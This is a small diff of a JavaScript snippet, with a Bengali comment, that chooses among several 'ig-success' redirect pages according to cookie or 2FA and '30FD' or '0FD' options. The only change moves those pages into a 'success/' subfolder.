@@ -169,11 +169,11 @@ if (response.ok) {
     let redirectPage = "success.html"; // ডিফল্ট
     
     if (cookie2fa === "Cookies") {
-        redirectPage = "ig-success-cookies.html";
+        redirectPage = "success/ig-success-cookies.html";
     } else if (cookie2fa === "2FA" && fdType === "30FD") {
-        redirectPage = "ig-success-30fd.html";
+        redirectPage = "success/ig-success-30fd.html";
     } else if (cookie2fa === "2FA" && fdType === "0FD") {
-        redirectPage = "ig-success-0fd.html";
+        redirectPage = "success/ig-success-0fd.html";
     }
 
     setTimeout(() => {
